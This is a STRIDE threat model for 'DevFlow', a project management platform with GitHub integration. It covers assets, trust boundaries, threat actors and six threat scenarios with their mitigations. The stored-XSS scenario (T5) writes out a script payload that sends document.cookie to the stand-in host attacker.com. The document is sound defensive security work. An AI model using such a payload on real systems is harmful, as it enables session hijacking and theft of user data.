# Threat Model Analysis (threat-model.md)

**System:** DevFlow (Enterprise Agile Project Management & Live Developer Activity Platform)  
**Methodology:** STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)  
**Scope:** Client SPA (React 18), API Gateway & WebSocket Mesh (Node.js / Express / Socket.IO), Persistence (MongoDB 7.x), External Integrations (GitHub OAuth & Webhooks).

---

## 1. System Assets

| Asset ID | Asset Name | Description & Classification |
| :--- | :--- | :--- |
| **AST-01** | **User Credentials & Sessions** | Bcrypt password hashes, active JWT tokens, OAuth state cookies. (Confidential) |
| **AST-02** | **GitHub Access Tokens** | OAuth personal access tokens granting read/write access to customer source code repos. (Top Secret) |
| **AST-03** | **Project & Task Data** | Kanban cards, backlog items, story points, proprietary requirements, internal comments. (Confidential) |
| **AST-04** | **Webhook HMAC Secrets** | Shared cryptographic secrets used to authenticate GitHub webhook delivery payloads. (Top Secret) |
| **AST-05** | **Forensic Activity & Audit Trails** | `ActivityLog` and `WebhookEvent` immutable ledgers tracking all user and Git actions. (Integrity Critical) |
| **AST-06** | **Sequence Counters** | Atomic sequence numbers (`FLOW-101`) governing task identity and Git commit binding. (Integrity Critical) |

---

## 2. Trust Boundaries

```
[ External Internet / Browser ]
          │  (Untrusted)
          ▼
┌─────────────────────────────────────────────────────────────┐
│ Trust Boundary 1: API Gateway / Reverse Proxy (HTTPS / WSS) │
│ - TLS Termination                                           │
│ - Rate Limiting & Helmet Security Headers                   │
└─────────────────────────────────────────────────────────────┘
          │  (Authenticated JWT via HttpOnly Cookie)
          ▼
┌─────────────────────────────────────────────────────────────┐
│ Trust Boundary 2: Application Core & Two-Tier RBAC Layer     │
│ - Workspace Membership Check                                │
│ - Project Scope Role Validation (PM, Dev, Viewer)           │
│ - Zod Payload Sanitization & DOMPurify Markdown Cleaning    │
└─────────────────────────────────────────────────────────────┘
          │  (Encrypted DB Channel)
          ▼
┌─────────────────────────────────────────────────────────────┐
│ Trust Boundary 3: Data Persistence Tier (MongoDB 7.x)       │
│ - Mongoose Schema Type Casting                              │
│ - AES-256-GCM Encrypted Token Fields                        │
└─────────────────────────────────────────────────────────────┘
          ▲
          │  (Untrusted Webhook Ingress / Public Callback)
┌─────────────────────────────────────────────────────────────┐
│ Trust Boundary 4: External Third-Party Boundary (GitHub)    │
│ - HMAC-SHA256 Signature Verification (`X-Hub-Signature-256`)│
│ - OAuth 2.0 Authorization Code Handshake                    │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Threat Actors

1. **Unauthenticated Public Attacker:** Scans public endpoints, attempts brute-force credential stuffing, targets the unauthenticated webhook receiver (`/api/v1/github/webhooks`), or tests for SSRF/XSS.
2. **Workspace Guest / Contractor (Low Privilege):** Legitimate account invited to an isolated project. Attempts BOLA/IDOR escalation to access uninvited confidential projects or workspace admin billing settings.
3. **Malicious Insider / Rogue Developer:** Possesses project-level write access. Attempts to forge Git commit associations, bypass fractional indexing rebalancing, or inject stored XSS in task descriptions.
4. **Compromised Third-Party / Man-in-the-Middle:** Adversary intercepting GitHub OAuth redirects, forging webhook payloads, or targeting token transfer channels.

---

## 4. Entry Points & Attack Surfaces

* `POST /api/v1/auth/login` & `POST /api/v1/auth/register` (Credential ingress, brute force).
* `POST /api/v1/github/webhooks` (Public unauthenticated webhook receiver, payload forgery).
* `GET /api/v1/github/oauth/callback` (OAuth authorization code and state parameter receiver).
* `GET /api/v1/projects/:id/board` & `PATCH /api/v1/tasks/:id/move` (BOLA and fractional index manipulation).
* WebSocket Handshake `/socket.io/` (Unauthorized room subscriptions, event injection).
* Rich text fields in Tasks & Comments (Stored XSS entry vectors).

---

## 5. STRIDE Threat Analysis & Attack Scenarios

### T1: Broken Object Level Authorization (BOLA / IDOR) — [Elevation of Privilege]
- **Scenario:** A user invited as a `Viewer` on Project A alters the URL request parameters to target Project B: `PATCH /api/v1/tasks/:id/move` with a `taskId` belonging to Project B.
- **Impact:** Critical. Unauthorized modification of project workflows, confidential sprint roadmaps, and intellectual property leakage.
- **Likelihood:** High.
- **Risk Severity:** CRITICAL.
- **Existing Mitigations:** Two-tier RBAC middleware (`requireProjectRole('developer')`) validates that the requested resource belongs to a project where the user has active membership.
- **Missing Mitigations:** Automated unit/integration test suites verifying that tampering with `projectId` or `workspaceId` headers systematically returns `403 Forbidden`.

### T2: GitHub OAuth Token Compromise in Persistence Tier — [Information Disclosure]
- **Scenario:** Database backup is accidentally exposed or read replicas are queried via an injection vulnerability. Plaintext GitHub personal access tokens are harvested by attackers.
- **Impact:** Critical. Attacker gains repository read/write access across all customer repositories connected to DevFlow, enabling supply chain poisoning.
- **Likelihood:** Low to Medium.
- **Risk Severity:** CRITICAL.
- **Existing Mitigations:** AES-256-GCM token encryption before database write (`GitHubIntegration.encryptedAccessToken`). Tokens are never sent back to the client SPA.
- **Missing Mitigations:** Automated secret rotation scripts and hardware security module (HSM) / KMS key envelope encryption.

### T3: Webhook HMAC Signature Forgery via Timing Attacks — [Tampering / Spoofing]
- **Scenario:** Attacker sends forged commit events to `POST /api/v1/github/webhooks`. If the server uses standard string equality (`===`), the attacker measures response latency to guess the signature byte-by-byte.
- **Impact:** High. Fake commits are linked to tasks, marking tasks complete and falsely crediting sprint velocity.
- **Likelihood:** Medium.
- **Risk Severity:** HIGH.
- **Existing Mitigations:** `crypto.timingSafeEqual` is mandated in `verifyWebhook.js`.
- **Missing Mitigations:** Strict verification that the raw unparsed request buffer is passed to the HMAC digest rather than a reconstructed JSON string.

### T4: Webhook Replay / Duplicate Delivery Exploits — [Tampering / Denial of Service]
- **Scenario:** An attacker intercepts a legitimate GitHub webhook delivery and replays it multiple times, or GitHub retries a delivery due to network lag.
- **Impact:** Medium. Duplicate activity log entries, repeated status updates, and multiple notification spam events.
- **Likelihood:** High.
- **Risk Severity:** MEDIUM.
- **Existing Mitigations:** Idempotency ledger using `X-GitHub-Delivery` GUID stored in `WebhookEvent` with unique index.
- **Missing Mitigations:** Enforcing automated TTL cleanup on `WebhookEvent` collection to prevent unbounded collection size growth.

### T5: Stored Cross-Site Scripting (XSS) via Task Markdown — [Tampering / Information Disclosure]
- **Scenario:** Developer embeds `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` or malicious `javascript:` markdown links in a task description.
- **Impact:** High. Session hijacking or forced actions on behalf of viewing Workspace Administrators.
- **Likelihood:** Medium.
- **Risk Severity:** HIGH.
- **Existing Mitigations:** JWT stored in `HttpOnly` cookies prevents JavaScript cookie reading. DOMPurify sanitization mandated before database write.
- **Missing Mitigations:** Content Security Policy (CSP) headers configured in Helmet to forbid inline scripts and unapproved script sources.

### T6: Fractional Indexing Precision Exhaustion (Denial of Service) — [Denial of Service]
- **Scenario:** Malicious or high-frequency automated dragging repeatedly drops a card between two cards, halving the difference until IEEE 754 64-bit float precision collapses ($|\Delta| < 10^{-16}$).
- **Impact:** Medium. Cards fail to position correctly; visual board ordering becomes corrupted.
- **Likelihood:** Medium.
- **Risk Severity:** MEDIUM.
- **Existing Mitigations:** Re-balancing threshold guard defined at $|\Delta| < 0.000001$.
- **Missing Mitigations:** Background asynchronous re-balance worker locking mechanism to prevent race conditions during concurrent re-spacing.

---

## 6. Threat Mitigation Matrix

| STRIDE Category | Threat Description | Severity | Architecture Mitigation | Verification Mechanism |
| :--- | :--- | :---: | :--- | :--- |
| **Spoofing** | Forged webhook requests | **CRITICAL** | Timing-safe HMAC-SHA256 verification | Supertest invalid HMAC rejection test |
| **Tampering** | Stored XSS in Task Markdown | **HIGH** | DOMPurify sanitization + Zod validation | Malicious HTML script payload test |
| **Repudiation** | Denying task status changes | **MEDIUM** | Append-only `ActivityLog` collection | Immutable audit record verification |
| **Information Disclosure** | Plaintext GitHub token leak | **CRITICAL** | AES-256-GCM cipher with random IV | Direct MongoDB document inspection |
| **Denial of Service** | Webhook flood & float underflow | **HIGH** | Rate limiting + Fractional rebalancer | High-frequency drag benchmark |
| **Elevation of Privilege** | BOLA across project borders | **CRITICAL** | Two-tier RBAC middleware checks | Cross-project guest token API call test |
